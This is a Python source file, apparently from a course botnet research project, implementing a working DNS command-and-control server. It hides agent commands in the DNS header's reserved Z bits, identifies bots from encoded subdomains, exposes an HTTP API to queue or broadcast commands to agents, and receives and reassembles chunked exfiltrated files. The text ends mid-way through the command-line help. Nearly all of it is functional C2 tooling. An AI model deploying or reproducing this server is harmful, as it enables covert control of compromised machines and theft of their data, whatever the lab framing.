"""
====================================================
 AUA CS 232/337 — Botnet Research Project
 Component: Authoritative DNS C2 Server (Z-Flag) — v2
 Environment: ISOLATED VM LAB ONLY
====================================================

Fully updated server that integrates all previously-missing modules:

  dns_logging.py       → replaces all print() with structured logging
  dns_zone_system.py   → replaces SimpleZone with full multi-record ZoneSystem
  dns_packet_analysis.py → replaces flat dict parsing with full analysis pipeline

Previously-implemented (retained from original):
  ✅ Per-agent Z-value command queue (ZCommandQueue)
  ✅ Token-bucket rate limiter (RateLimiter)
  ✅ Packet capture (PacketCapture)
  ✅ Per-agent exfil handler (ExfilHandler)
  ✅ Server statistics (ServerStats)
  ✅ HTTP monitoring + control plane (/health, /metrics, /command, /upload)
  ✅ Failure simulation
  ✅ Worker pool + round-robin dispatch

New additions:
  ✅ Full zone system (SOA, NS, A, AAAA, CNAME, MX, TXT) from dns_zone_system.py
  ✅ YAML server config file (configs/dns_server.yaml) loaded at startup
  ✅ Zone consistency validation at startup
  ✅ Structured logging (TEXT or JSON, configurable level+output)
  ✅ Full packet analysis pipeline (HeaderAnalysis, QuestionAnalysis, PacketAnalysis)
  ✅ EDNS OPT detection, domain structural validation, RFC-violation warnings

Usage:
  # Default (reads configs/dns_server.yaml, binds :53):
  sudo python3 dns_zflag_server.py

  # Custom config file:
  sudo python3 dns_zflag_server.py --config /path/to/server.yaml

  # Override specific settings:
  sudo python3 dns_zflag_server.py --bind 0.0.0.0 --port 5053 --zone-ip 192.168.1.10

  # Queue a command for an agent (in another terminal):
  curl -X POST http://localhost:8080/command \\
       -H "Content-Type: application/json" \\
       -d '{"agent_id": "AGENT-ABCD1234", "z_value": 2}'

  # Broadcast SLEEP to all known agents:
  curl -X POST http://localhost:8080/command \\
       -d '{"agent_id": "*", "z_value": 1}'
"""

import base64
import json
import os
import random
import socket
import struct
import sys
import threading
import time
from collections import defaultdict, deque
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs

# ─── local imports ─────────────────────────────────────────────────────────
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import dns_logging as log

from dns_zflag_crafter import (
    Z_COMMAND_MAP, QTYPE_MAP, QTYPE_REVERSE,
    apply_z_flag, read_z_flag, read_header, read_flags,
    _decode_name, _parse_rr, visualize_packet,
    decode_subdomain_info, is_likely_encoded_subdomain,
    encode_dns_name, shannon_entropy,
)
from dns_zone_system import ZoneSystem, load_server_yaml
from dns_packet_analysis import DNSPacketAnalyzer


# ═════════════════════════════════════════════════════════════════════════════
#  ServerConfig
#  Mirrors Spinnekop internal/models/srv_models/models_srv.go +
#          cmd/server/config.go (applyDefaults + Validate)
#
#  NEW: can be loaded from configs/dns_server.yaml via from_yaml()
# ═════════════════════════════════════════════════════════════════════════════

class ServerConfig:
    """Complete DNS server configuration with YAML loading and validation."""

    def __init__(self, **kw):
        # ── Server ────────────────────────────────────────────────────────
        self.bind_address: str   = kw.get("bind_address", "0.0.0.0")
        self.port: int            = kw.get("port", 53)
        self.max_workers: int     = kw.get("max_workers", 4)
        self.worker_buf: int      = kw.get("worker_buf", 10)
        self.read_timeout: float  = kw.get("read_timeout", 5.0)
        self.write_timeout: float = kw.get("write_timeout", 3.0)
        self.max_packet_size: int = kw.get("max_packet_size", 512)

        # ── Logging (NEW: drives dns_logging initialisation) ──────────────
        self.log_level: str      = kw.get("log_level",      "DEBUG")
        self.log_format: str     = kw.get("log_format",     "TEXT")
        self.log_output: str     = kw.get("log_output",     "STDOUT")
        self.log_queries: bool   = kw.get("log_queries",    True)
        self.log_responses: bool = kw.get("log_responses",  True)
        self.packet_dump: bool   = kw.get("packet_dump",    False)

        # ── Zone ─────────────────────────────────────────────────────────
        self.zone_name: str      = kw.get("zone_name", "timeserversync.com.")
        self.zone_ip: str        = kw.get("zone_ip",   "127.0.0.1")
        self.zone_ttl: int       = kw.get("zone_ttl",  300)
        self.yaml_config: str    = kw.get("yaml_config", "")  # path to dns_server.yaml

        # ── Rate limiting ─────────────────────────────────────────────────
        self.rate_limit_enabled: bool = kw.get("rate_limit_enabled", True)
        self.max_qps: int             = kw.get("max_qps",   20)
        self.max_qpm: int             = kw.get("max_qpm",  200)
        self.blacklist_duration: float= kw.get("blacklist_duration", 30.0)

        # ── Query filtering ───────────────────────────────────────────────
        self.allowed_qtypes: List[str] = kw.get(
            "allowed_qtypes",
            ["A", "AAAA", "CNAME", "MX", "TXT", "NS", "SOA", "ANY"]
        )
        self.blocked_ips: List[str]   = kw.get("blocked_ips",  [])
        self.allowed_ips: List[str]   = kw.get("allowed_ips",  [])
        self.refuse_recursion: bool   = kw.get("refuse_recursion", True)

        # ── Monitoring (NEW: actually started) ────────────────────────────
        self.metrics_enabled: bool = kw.get("metrics_enabled", True)
        self.metrics_port: int     = kw.get("metrics_port", 8080)
        self.health_port: int      = kw.get("health_port",  8081)

        # ── HTTP exfil ────────────────────────────────────────────────────
        self.exfil_dir: str        = kw.get("exfil_dir", "/tmp/exfiltrated")

        # ── Development (NEW: actually used) ─────────────────────────────
        self.simulate_failures: bool = kw.get("simulate_failures", False)
        self.failure_rate: float     = kw.get("failure_rate", 0.0)
        self.packet_capture: bool    = kw.get("packet_capture", False)
        self.capture_dir: str        = kw.get("capture_dir", "/tmp/dns_captures")
        self.capture_max_files: int  = kw.get("capture_max_files", 1000)

    @classmethod
    def from_yaml(cls, path: str) -> "ServerConfig":
        """
        Load configuration from a YAML file.
        NEW: Mirrors the intent of Spinnekop ConfigLoader.Load().
        Falls back gracefully if a section is absent.
        """
        raw = load_server_yaml(path)

        srv = raw.get("server",  {})
        lg  = raw.get("logging", {})
        sec = raw.get("security", {})
        rl  = sec.get("rate_limiting",    {})
        qf  = sec.get("query_filtering",  {})
        rp  = sec.get("response_policies",{})
        mon = raw.get("monitoring",    {})
        dev = raw.get("development",   {})
        sf  = dev.get("simulate_failures", {})
        pc  = dev.get("packet_capture",    {})

        # Extract zone_ip from the first zone's first A record (convenience)
        zones_raw = raw.get("zones", [])
        zone_ip   = "127.0.0.1"
        zone_name = "timeserversync.com."
        if zones_raw:
            zone_name = zones_raw[0].get("name", zone_name)
            for ar in zones_raw[0].get("a_records", []):
                if not ar.get("name","").startswith("*."):
                    zone_ip = ar.get("ip", zone_ip)
                    break

        return cls(
            bind_address     = srv.get("bind_address",             "0.0.0.0"),
            port             = srv.get("port",                     53),
            max_workers      = srv.get("max_workers",              4),
            worker_buf       = srv.get("worker_channel_buffer_size", 10),
            read_timeout     = float(srv.get("read_timeout",       5.0)),
            write_timeout    = float(srv.get("write_timeout",      3.0)),
            max_packet_size  = srv.get("max_packet_size",          512),

            log_level        = lg.get("level",    "DEBUG"),
            log_format       = lg.get("format",   "TEXT"),
            log_output       = lg.get("output",   "STDOUT"),
            log_queries      = lg.get("log_queries",   True),
            log_responses    = lg.get("log_responses",  True),
            packet_dump      = lg.get("packet_dump",    False),

            zone_name        = zone_name,
            zone_ip          = zone_ip,
            yaml_config      = path,

            rate_limit_enabled   = rl.get("enabled", True),
            max_qps              = rl.get("max_queries_per_second", 20),
            max_qpm              = rl.get("max_queries_per_minute", 200),
            blacklist_duration   = float(rl.get("blacklist_duration", 30.0)),

            allowed_qtypes       = qf.get("allowed_types",
                                          ["A","AAAA","CNAME","MX","TXT","NS","SOA","ANY"]),
            blocked_ips          = qf.get("blocked_ips",  []),
            allowed_ips          = qf.get("allowed_ips",  []),
            refuse_recursion     = rp.get("refuse_recursion", True),

            metrics_enabled      = mon.get("metrics", {}).get("enabled", True),
            metrics_port         = mon.get("metrics", {}).get("port",    8080),
            health_port          = mon.get("health_check", {}).get("port", 8081),

            simulate_failures    = sf.get("enabled",      False),
            failure_rate         = float(sf.get("failure_rate", 0.0)),
            packet_capture       = pc.get("enabled",      False),
            capture_dir          = pc.get("directory",    "/tmp/dns_captures"),
            capture_max_files    = pc.get("max_files",    1000),
        )

    def validate(self) -> List[str]:
        """Return validation error strings (empty = OK)."""
        errs = []
        try:
            socket.inet_aton(self.bind_address)
        except Exception:
            errs.append(f"bind_address '{self.bind_address}' is not a valid IP")
        if not (1 <= self.port <= 65535):
            errs.append(f"port {self.port} out of range 1-65535")
        if not (1 <= self.max_workers <= 1000):
            errs.append(f"max_workers {self.max_workers} out of range 1-1000")
        if self.read_timeout < 1:
            errs.append(f"read_timeout {self.read_timeout} must be ≥1s")
        if self.max_packet_size < 512:
            errs.append(f"max_packet_size must be ≥512 bytes")
        if not (0.0 <= self.failure_rate <= 1.0):
            errs.append(f"failure_rate {self.failure_rate} must be 0.0-1.0")
        return errs

    def get_address(self) -> str:
        return f"{self.bind_address}:{self.port}"


# ═════════════════════════════════════════════════════════════════════════════
#  Per-agent Z-value command queue  (unchanged — already correct)
# ═════════════════════════════════════════════════════════════════════════════

class ZCommandQueue:
    """
    Per-agent command queue.
    Each agent beacon carries its ID in the subdomain label.
    The server decodes it, dequeues one command, and injects it as Z-value.
    Default (empty queue) → Z=0 (CONTINUE).
    """
    def __init__(self):
        self._lock    = threading.Lock()
        self._queues: Dict[str, deque] = defaultdict(deque)
        self._history: Dict[str, List] = defaultdict(list)
        self._seen:    Dict[str, float] = {}

    def enqueue(self, agent_id: str, z_value: int) -> None:
        if not (0 <= z_value <= 7):
            raise ValueError(f"Z-value must be 0-7, got {z_value}")
        with self._lock:
            self._queues[agent_id].append(z_value)
        log.info("Z-command queued",
                 agent=agent_id, z_value=z_value,
                 command=Z_COMMAND_MAP.get(z_value,"?"),
                 queue_depth=len(self._queues[agent_id]))

    def dequeue(self, agent_id: str) -> int:
        with self._lock:
            self._seen[agent_id] = time.time()
            if self._queues[agent_id]:
                z = self._queues[agent_id].popleft()
                self._history[agent_id].append({
                    "z": z, "cmd": Z_COMMAND_MAP.get(z,"?"),
                    "ts": datetime.now().isoformat()
                })
                return z
        return 0

    def peek(self, agent_id: str) -> Optional[int]:
        with self._lock:
            q = self._queues[agent_id]
            return q[0] if q else None

    def queue_depth(self, agent_id: str) -> int:
        with self._lock:
            return len(self._queues[agent_id])

    def list_agents(self) -> Dict:
        with self._lock:
            all_ids = set(self._queues) | set(self._seen)
            return {
                aid: {
                    "pending":     list(self._queues[aid]),
                    "last_seen":   self._seen.get(aid, 0),
                    "history_len": len(self._history[aid]),
                }
                for aid in all_ids
            }

    def broadcast(self, z_value: int) -> int:
        known = list(self._seen.keys())
        for aid in known:
            self.enqueue(aid, z_value)
        return len(known)


# ═════════════════════════════════════════════════════════════════════════════
#  Token-bucket rate limiter  (unchanged — already correct)
# ═════════════════════════════════════════════════════════════════════════════

class RateLimiter:
    def __init__(self, max_qps: int, max_qpm: int, blacklist_sec: float):
        self.max_qps       = max_qps
        self.max_qpm       = max_qpm
        self.blacklist_sec = blacklist_sec
        self._lock         = threading.Lock()
        self._buckets: Dict[str, List] = {}
        self._minute: Dict[str, deque] = defaultdict(lambda: deque(maxlen=10000))
        self._blacklist: Dict[str, float] = {}
        self._stats = {"total_allowed": 0, "total_blocked": 0}

    def allow(self, ip: str) -> bool:
        now = time.time()
        with self._lock:
            until = self._blacklist.get(ip, 0)
            if now < until:
                self._stats["total_blocked"] += 1
                return False
            elif until > 0:
                del self._blacklist[ip]

            tokens, last = self._buckets.get(ip, (self.max_qps, now))
            elapsed = now - last
            tokens  = min(self.max_qps, tokens + elapsed * self.max_qps)
            if tokens < 1:
                self._blacklist[ip] = now + self.blacklist_sec
                self._stats["total_blocked"] += 1
                log.warn("IP blacklisted (rate exceeded)", ip=ip,
                         blacklist_seconds=self.blacklist_sec)
                return False
            self._buckets[ip] = [tokens - 1, now]

            q = self._minute[ip]
            q.append(now)
            cutoff = now - 60.0
            while q and q[0] < cutoff:
                q.popleft()
            if len(q) > self.max_qpm:
                self._blacklist[ip] = now + self.blacklist_sec
                self._stats["total_blocked"] += 1
                return False

            self._stats["total_allowed"] += 1
            return True

    def stats(self) -> Dict:
        with self._lock:
            return dict(self._stats)


# ═════════════════════════════════════════════════════════════════════════════
#  Packet capture  (unchanged — already correct)
# ═════════════════════════════════════════════════════════════════════════════

class PacketCapture:
    """Writes a valid pcap file. Fixes Spinnekop: config defined, never used."""
    MAGIC      = 0xA1B2C3D4
    HEADER_FMT = "<IHHiIII"

    def __init__(self, directory: str, max_files: int = 100):
        os.makedirs(directory, exist_ok=True)
        self._dir  = directory
        self._lock = threading.Lock()
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        self._path = os.path.join(directory, f"dns_capture_{ts}.pcap")
        self._f    = open(self._path, "wb")
        self._f.write(struct.pack(self.HEADER_FMT,
                                   self.MAGIC, 2, 4, 0, 0, 65535, 101))
        self._count = 0

    def write(self, data: bytes, src_ip: str = "") -> None:
        now     = time.time()
        ts_sec  = int(now)
        ts_usec = int((now % 1) * 1e6)
        with self._lock:
            self._f.write(struct.pack("<IIII",
                                      ts_sec, ts_usec, len(data), len(data)))
            self._f.write(data)
            self._f.flush()
            self._count += 1

    def close(self) -> None:
        with self._lock:
            self._f.close()
        log.info("Packet capture saved",
                 path=self._path, packets=self._count)


# ═════════════════════════════════════════════════════════════════════════════
#  Per-agent exfil handler  (unchanged — already correct)
# ═════════════════════════════════════════════════════════════════════════════

class ExfilHandler:
    """Receive chunked base64 uploads. Stores per-agent, reassembles on completion."""
    def __init__(self, base_dir: str):
        self._base  = base_dir
        self._lock  = threading.Lock()
        self._chunks: Dict[str, Dict[int, str]] = defaultdict(dict)
        os.makedirs(base_dir, exist_ok=True)

    def receive_chunk(self, agent_id: str, chunk_idx: int,
                      total: int, data: bytes) -> bool:
        agent_dir  = os.path.join(self._base, agent_id)
        os.makedirs(agent_dir, exist_ok=True)
        chunk_path = os.path.join(agent_dir, f"chunk_{chunk_idx:04d}.dat")
        with open(chunk_path, "wb") as f:
            f.write(data)
        with self._lock:
            self._chunks[agent_id][chunk_idx] = chunk_path
            received = len(self._chunks[agent_id])
        log.debug("Exfil chunk received",
                  agent=agent_id, chunk=f"{chunk_idx+1}/{total}",
                  bytes=len(data))
        if received == total:
            self._reassemble(agent_id, total)
            return True
        return False

    def _reassemble(self, agent_id: str, total: int) -> None:
        agent_dir = os.path.join(self._base, agent_id)
        all_b64   = ""
        with self._lock:
            for idx in range(total):
                path = self._chunks[agent_id].get(idx)
                if path and os.path.exists(path):
                    with open(path, "rb") as f:
                        all_b64 += f.read().decode(errors="replace")
        try:
            decoded  = base64.b64decode(all_b64)
            out_path = os.path.join(agent_dir, "reassembled_file.bin")
            with open(out_path, "wb") as f:
                f.write(decoded)
            log.info("Exfil file reassembled",
                     agent=agent_id, bytes=len(decoded), path=out_path)
        except Exception as e:
            log.error("Exfil reassembly failed", agent=agent_id, error=str(e))
        with self._lock:
            del self._chunks[agent_id]


# ═════════════════════════════════════════════════════════════════════════════
#  Server statistics  (unchanged — already correct)
# ═════════════════════════════════════════════════════════════════════════════

class ServerStats:
    def __init__(self):
        self._lock           = threading.Lock()
        self.start_time      = time.time()
        self.queries_rx      = 0
        self.responses_tx    = 0
        self.refused         = 0
        self.nxdomain        = 0
        self.rate_blocked    = 0
        self.filter_blocked  = 0
        self.simulated_drops = 0
        self.z_injections: Dict[int, int] = defaultdict(int)
        self.agents_seen:  Dict[str, float] = {}

    def record_query(self)        -> None:
        with self._lock: self.queries_rx += 1

    def record_response(self, z: int) -> None:
        with self._lock:
            self.responses_tx += 1
            self.z_injections[z] += 1

    def record_agent(self, aid: str) -> None:
        with self._lock:
            self.agents_seen[aid] = time.time()

    def to_dict(self) -> Dict:
        with self._lock:
            uptime = time.time() - self.start_time
            return {
                "uptime_seconds":     round(uptime, 1),
                "queries_received":   self.queries_rx,
                "responses_sent":     self.responses_tx,
                "refused":            self.refused,
                "nxdomain":           self.nxdomain,
                "rate_blocked":       self.rate_blocked,
                "filter_blocked":     self.filter_blocked,
                "simulated_drops":    self.simulated_drops,
                "z_distribution":     dict(self.z_injections),
                "agents_seen":        len(self.agents_seen),
                "agent_ids":          list(self.agents_seen.keys()),
            }


# ═════════════════════════════════════════════════════════════════════════════
#  HTTP control plane  (updated: uses log. instead of print())
# ═════════════════════════════════════════════════════════════════════════════

def _make_http_handler(server_ref: "DNSZFlagServer"):
    class _Handler(BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            pass   # suppress BaseHTTPRequestHandler's own logging

        def _json(self, code: int, obj: dict) -> None:
            body = json.dumps(obj, indent=2).encode()
            self.send_response(code)
            self.send_header("Content-Type",   "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            srv: DNSZFlagServer = server_ref
            if self.path in ("/health", "/healthz"):
                self._json(200, {
                    "status": "ok",
                    "uptime": round(time.time() - srv.stats.start_time, 1),
                    "agents": len(srv.z_queue.list_agents()),
                })
            elif self.path == "/metrics":
                self._json(200, {
                    "stats":        srv.stats.to_dict(),
                    "rate_limiter": (srv.rate_limiter.stats()
                                     if srv.rate_limiter else {}),
                    "agents":       srv.z_queue.list_agents(),
                })
            elif self.path == "/agents":
                self._json(200, srv.z_queue.list_agents())
            else:
                self._json(404, {"error": "not found"})

        def do_POST(self):
            srv: DNSZFlagServer = server_ref
            length = int(self.headers.get("Content-Length", 0))
            body   = self.rfile.read(length) if length else b""

            if self.path == "/command":
                try:
                    req = json.loads(body)
                    aid = req.get("agent_id", "*")
                    z   = int(req.get("z_value", 0))
                    if aid == "*":
                        n = srv.z_queue.broadcast(z)
                        self._json(200, {"status": "broadcast", "agents": n,
                                         "z_value": z,
                                         "command": Z_COMMAND_MAP.get(z)})
                    else:
                        srv.z_queue.enqueue(aid, z)
                        self._json(200, {"status": "queued", "agent_id": aid,
                                         "z_value": z,
                                         "command": Z_COMMAND_MAP.get(z)})
                except Exception as e:
                    self._json(400, {"error": str(e)})

            elif self.path.startswith("/upload"):
                parsed = urlparse(self.path)
                qs     = parse_qs(parsed.query)
                aid    = qs.get("agent_id", ["unknown"])[0]
                chunk  = int(qs.get("chunk", ["0"])[0])
                total  = int(qs.get("total", ["1"])[0])
                srv.exfil.receive_chunk(aid, chunk, total, body)
                self._json(200, {"status": "received"})

            elif self.path in ("/", ""):
                self.wfile.write(b"HTTP/1.1 200 OK\r\nContent-Length: 24\r\n\r\nYou have hit the endpoint")

            else:
                self._json(404, {"error": "not found"})

    return _Handler


def _start_http_server(handler_class, port: int, label: str) -> threading.Thread:
    try:
        httpd = HTTPServer(("0.0.0.0", port), handler_class)
        t = threading.Thread(target=httpd.serve_forever,
                             name=f"http-{label}", daemon=True)
        t.start()
        log.info(f"HTTP {label} listening", port=port)
        return t
    except OSError as e:
        log.warn(f"Could not start {label} endpoint", port=port, error=str(e))
        return None


# ═════════════════════════════════════════════════════════════════════════════
#  QueryProcessor
#  UPDATED: uses ZoneSystem + DNSPacketAnalyzer + structured logging
# ═════════════════════════════════════════════════════════════════════════════

class QueryProcessor:
    """
    Parses, analyses, and responds to a single DNS query.
    Integrates all four new modules.
    """

    def __init__(self, zone_system: ZoneSystem,
                 config:      ServerConfig,
                 z_queue:     ZCommandQueue,
                 stats:       ServerStats):
        self.zones    = zone_system
        self.cfg      = config
        self.z_q      = z_queue
        self.stats    = stats
        self._allowed_types = {
            QTYPE_MAP.get(t.upper(), 0)
            for t in config.allowed_qtypes
        }
        # NEW: full packet analyzer wired to zone system
        self._analyzer = DNSPacketAnalyzer(zone_system=zone_system)
        self._dns_log  = log.get_logger("dns_handler")

    def process(self, data: bytes, client_ip: str) -> Optional[bytes]:
        """
        Full pipeline: parse → analyse → enforce → respond.
        Returns None to drop the packet silently.
        """
        if len(data) < 12:
            return None

        # ── Stage 1+2+3+4: Full packet analysis (NEW) ─────────────────────
        result = self._analyzer.analyze(data, client_ip)

        if not result.valid:
            self._dns_log.warn("Malformed packet dropped",
                               client=client_ip, error=result.error)
            return None

        hdr  = result.header
        q    = result.question

        if not q:
            return None   # No question section — drop

        # ── Structured query logging (NEW: uses dns_logging) ──────────────
        if self.cfg.log_queries:
            self._dns_log.query_received(
                client_ip, q.name, q.qtype_string, q.qclass
            )

        # ── Log analysis warnings (issues = problems, warnings = anomalies) 
        if result.analysis.warnings:
            self._dns_log.warn("Packet analysis warnings",
                               client=client_ip,
                               warnings=result.analysis.warnings)
        if result.analysis.issues:
            self._dns_log.warn("Packet analysis issues",
                               client=client_ip,
                               issues=result.analysis.issues)

        # ── Non-standard class (NEW: log properly) ─────────────────────────
        if not q.is_standard_class:
            self._dns_log.non_standard_class(client_ip, q.name, q.qclass)

        # ── EDNS detected ────────────────────────────────────────────────
        if result.analysis.has_edns:
            self._dns_log.debug("EDNS OPT record detected", client=client_ip)

        # ── Query type filtering (enforced) ───────────────────────────────
        if self._allowed_types and q.qtype not in self._allowed_types:
            self.stats.filter_blocked += 1
            self._dns_log.warn("Query type blocked",
                               client=client_ip, type=q.qtype_string)
            return self._error_response(data, 4)    # NOTIMP

        # ── IP filtering ──────────────────────────────────────────────────
        if client_ip in self.cfg.blocked_ips:
            return None
        if self.cfg.allowed_ips and client_ip not in self.cfg.allowed_ips:
            return None

        # ── Failure simulation (enforced) ─────────────────────────────────
        if self.cfg.simulate_failures and random.random() < self.cfg.failure_rate:
            self.stats.simulated_drops += 1
            return None

        # ── Encoded subdomain detection (Z=2 exfil) ───────────────────────
        labels = q.name.rstrip(".").split(".")
        if len(labels) >= 3 and is_likely_encoded_subdomain(labels[0]):
            decoded = decode_subdomain_info(labels[0])
            entropy = shannon_entropy(labels[0])
            self._dns_log.warn("Z=2 encoded subdomain detected",
                               client=client_ip,
                               label=labels[0][:40],
                               entropy=round(entropy, 2),
                               decoded=decoded[:80])

        # ── Agent identification ──────────────────────────────────────────
        agent_id = self._extract_agent_id(q.name, client_ip)
        self.stats.record_agent(agent_id)

        # ── Detailed query logging (debug) ────────────────────────────────
        if self.cfg.log_queries:
            self._dns_log.info("DNS Query details",
                               client=client_ip, domain=q.name,
                               type=q.qtype_string, class_=q.qclass_string,
                               agent=agent_id,
                               authoritative=result.analysis.supported_by_server,
                               non_zero_z=hdr.has_non_zero_z)

        # ── Build response via ZoneSystem (NEW) ───────────────────────────
        flags_raw = struct.unpack_from("!H", data, 2)[0]
        msg_id    = hdr.id

        z_value = self.z_q.dequeue(agent_id)
        response = self.zones.build_response(
            q.name, q.qtype, msg_id, flags_raw, z_value
        )

        # ── Response logging ───────────────────────────────────────────────
        if self.cfg.log_responses:
            rcode_of_resp = struct.unpack_from("!H", response, 2)[0] & 0x0F
            self._dns_log.response_sent(client_ip, rcode_of_resp, 1)
            self._dns_log.debug("Z-value injected",
                                agent=agent_id, z_value=z_value,
                                command=Z_COMMAND_MAP.get(z_value, "?"))

        # ── Packet dump (optional) ─────────────────────────────────────────
        if self.cfg.packet_dump:
            visualize_packet(response, "Response")

        self.stats.record_response(z_value)
        return response

    def _extract_agent_id(self, qname: str, fallback: str) -> str:
        parts = qname.rstrip(".").split(".")
        if len(parts) >= 3 and is_likely_encoded_subdomain(parts[0]):
            decoded = decode_subdomain_info(parts[0])
            return decoded.split("\\")[0] if "\\" in decoded else decoded[:32]
        return fallback

    @staticmethod
    def _error_response(original_data: bytes, rcode: int) -> bytes:
        if len(original_data) < 4:
            return b""
        msg_id = struct.unpack_from("!H", original_data, 0)[0]
        flags  = (struct.unpack_from("!H", original_data, 2)[0] | 0x8000) & 0xFFF0
        flags |= (rcode & 0x0F)
        qdcount = struct.unpack_from("!H", original_data, 4)[0] if len(original_data) >= 6 else 0
        header  = struct.pack("!HHHHHH", msg_id, flags, qdcount, 0, 0, 0)
        if len(original_data) > 12:
            return header + original_data[12:]
        return header


# ═════════════════════════════════════════════════════════════════════════════
#  Worker  (updated: uses log.)
# ═════════════════════════════════════════════════════════════════════════════

class Worker(threading.Thread):
    def __init__(self, worker_id: str,
                 processor: QueryProcessor,
                 conn:      socket.socket,
                 capture:   Optional[PacketCapture],
                 buf_size:  int = 10):
        super().__init__(name=f"worker-{worker_id}", daemon=True)
        self._id    = worker_id
        self._proc  = processor
        self._conn  = conn
        self._cap   = capture
        self._queue: deque = deque(maxlen=buf_size)
        self._cond  = threading.Condition()
        self._stop  = threading.Event()

    def enqueue(self, data: bytes, addr: Tuple[str, int]) -> bool:
        with self._cond:
            if len(self._queue) >= (self._queue.maxlen or 10):
                return False
            self._queue.append((data, addr))
            self._cond.notify()
            return True

    def run(self) -> None:
        log.debug("Worker started", worker_id=self._id)
        while not self._stop.is_set():
            with self._cond:
                while not self._queue and not self._stop.is_set():
                    self._cond.wait(timeout=1.0)
                if not self._queue:
                    continue
                data, addr = self._queue.popleft()
            if self._cap:
                self._cap.write(data, src_ip=addr[0])
            response = self._proc.process(data, addr[0])
            if response:
                try:
                    self._conn.sendto(response, addr)
                except Exception as e:
                    log.error("Send failed", worker_id=self._id,
                              client=addr[0], error=str(e))
        log.debug("Worker stopped", worker_id=self._id)

    def stop(self) -> None:
        self._stop.set()
        with self._cond:
            self._cond.notify_all()


# ═════════════════════════════════════════════════════════════════════════════
#  DNSZFlagServer  (updated: YAML load, zone system, structured logging)
# ═════════════════════════════════════════════════════════════════════════════

class DNSZFlagServer:
    """
    Full authoritative DNS C2 server with all Spinnekop features implemented.
    """

    def __init__(self, config: Optional[ServerConfig] = None):
        self.config  = config or ServerConfig()
        self.z_queue = ZCommandQueue()
        self.stats   = ServerStats()
        self.exfil   = ExfilHandler(self.config.exfil_dir)

        # NEW: ZoneSystem — full multi-record zone, loaded from YAML if available
        if self.config.yaml_config and os.path.exists(self.config.yaml_config):
            self.zones = ZoneSystem.from_yaml(self.config.yaml_config)
            log.info("Zones loaded from YAML", path=self.config.yaml_config,
                     count=len(self.zones.zones))
        else:
            self.zones = ZoneSystem.simple(self.config.zone_name,
                                           self.config.zone_ip,
                                           self.config.zone_ttl)
            log.info("Using simple zone", zone=self.config.zone_name,
                     ip=self.config.zone_ip)

        self.rate_limiter = (
            RateLimiter(self.config.max_qps, self.config.max_qpm,
                        self.config.blacklist_duration)
            if self.config.rate_limit_enabled else None
        )
        self.capture = (PacketCapture(self.config.capture_dir,
                                      self.config.capture_max_files)
                        if self.config.packet_capture else None)

        # NEW: QueryProcessor uses ZoneSystem + DNSPacketAnalyzer
        self._processor = QueryProcessor(
            self.zones, self.config, self.z_queue, self.stats
        )
        self._workers: List[Worker] = []
        self._conn:    Optional[socket.socket] = None
        self._stop     = threading.Event()

    def start(self) -> None:
        """Validate → zone-consistency-check → start workers → accept loop."""
        # Config validation
        errs = self.config.validate()
        if errs:
            for e in errs:
                log.error("Config validation error", detail=e)
            sys.exit(1)

        # NEW: Zone consistency checks (mirrors Spinnekop performZoneConsistencyChecks)
        log.info("Performing zone consistency checks")
        zone_errs = self.zones.validate_all()
        warnings  = [e for e in zone_errs if "[warning]" in e]
        hard_errs = [e for e in zone_errs if "[error]"   in e]
        for w in warnings:
            log.warn("Zone consistency warning", detail=w)
        if hard_errs:
            for e in hard_errs:
                log.error("Zone consistency error", detail=e)
            sys.exit(1)
        log.info("Zone consistency checks passed")

        # HTTP control plane (metrics + exfil)
        if self.config.metrics_enabled:
            handler = _make_http_handler(self)
            _start_http_server(handler, self.config.metrics_port, "metrics+control+exfil")
            _start_http_server(handler, self.config.health_port,  "health")

        # Bind UDP socket
        self._conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._conn.bind((self.config.bind_address, self.config.port))
        self._conn.settimeout(self.config.read_timeout)

        # Worker pool
        for i in range(self.config.max_workers):
            w = Worker(str(i), self._processor, self._conn,
                       self.capture, self.config.worker_buf)
            w.start()
            self._workers.append(w)

        self._print_banner()

        # Accept loop
        buf = bytearray(self.config.max_packet_size)
        while not self._stop.is_set():
            try:
                n, addr = self._conn.recvfrom_into(buf)
            except socket.timeout:
                continue
            except Exception as e:
                if not self._stop.is_set():
                    log.error("UDP recv error", error=str(e))
                continue

            data   = bytes(buf[:n])
            src_ip = addr[0]
            self.stats.record_query()

            # Rate limiting
            if self.rate_limiter and not self.rate_limiter.allow(src_ip):
                self.stats.rate_blocked += 1
                continue   # silently drop

            # Round-robin to workers
            idx = n % len(self._workers)
            if not self._workers[idx].enqueue(data, addr):
                log.warn("Worker queue full — packet dropped",
                         worker_id=idx, client=src_ip)

    def shutdown(self) -> None:
        log.info("Shutting down server...")
        self._stop.set()
        for w in self._workers:
            w.stop()
        if self._conn:
            self._conn.close()
        if self.capture:
            self.capture.close()
        log.info("Server stopped.")

    def _print_banner(self) -> None:
        zones_summary = ", ".join(z.name for z in self.zones.zones)
        log.info("DNS Z-Flag C2 Server started",
                 address=self.config.get_address(),
                 zones=zones_summary,
                 workers=self.config.max_workers,
                 rate_limiting=self.config.rate_limit_enabled,
                 metrics_port=self.config.metrics_port,
                 health_port=self.config.health_port,
                 packet_capture=self.config.packet_capture,
                 failure_simulation=self.config.simulate_failures)
        log.info("Z-command API",
                 endpoint=f"POST :{self.config.metrics_port}/command",
                 example='{"agent_id":"*","z_value":2}')
        for z, cmd in sorted(Z_COMMAND_MAP.items()):
            log.debug("Z-command", z_value=z, command=cmd)


# ═════════════════════════════════════════════════════════════════════════════
#  CLI
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse, signal

    DEFAULT_CONFIG = "configs/dns_server.yaml"

    ap = argparse.ArgumentParser(
        description="DNS Z-Flag C2 Server (full implementation)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Default (reads configs/dns_server.yaml):
  sudo python3 dns_zflag_server.py

  # Custom config file:
  sudo python3 dns_zflag_server.py --config /path/to/server.yaml

  # Override zone without editing YAML:
